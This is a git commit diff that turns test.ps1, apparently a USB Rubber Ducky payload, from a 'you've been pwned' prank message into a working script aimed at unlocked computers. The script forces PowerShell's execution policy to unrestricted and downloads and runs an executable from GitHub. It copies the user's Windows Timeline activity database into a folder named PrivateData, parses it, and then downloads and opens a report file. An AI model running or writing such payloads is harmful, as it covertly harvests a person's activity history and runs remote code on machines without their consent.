d8afcc415229a4e033bf6f720676ebf2bf414b3d
jerfe <38888431+jerfe@users.noreply.github.com>
2023-02-24 00:00:38 +0100

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,2 +1,18 @@
-echo 'Your computer has been pwned! You will never know if malware persistence is remaining in the background because you just forgot to lock your session...'
+Set-executionpolicy unrestricted -force -Scope currentuser
+$workingfolder = "C:/PrivateData"
+mkdir $workingfolder -ErrorAction SilentlyContinue
+curl -usebasicparsing -proxy "http://127.0.0.1:9000" "https://raw.githubusercontent.com/jerfe/RubberDucky/main/WxTCmd.exe" -outfile "$workingfolder/WxTCmd.exe"
+$dbs = (gci "$($env:LOCALAPPDATA)\ConnectedDevicesPlatform" -recurse -Include 'ActivitiesCache.db').FullName 
+if($dbs.count -eq 0)
+{
+	Write-Host "No activities found"
+}
+else {
+	$dbs| foreach {
+		cp "$_" "$workingfolder/"
+		&"$workingfolder/WxTCmd.exe" -f "${workingfolder}/ActivitiesCache.db" --csv "$workingfolder"
+	}
+}
+curl -usebasicparsing -proxy "http://127.0.0.1:9000" "https://raw.githubusercontent.com/jerfe/RubberDucky/main/PCActivity.pbit" -outfile "$workingfolder/PCActivity.pbit"
+&"$workingfolder/PCActivity.pbit"
 pause
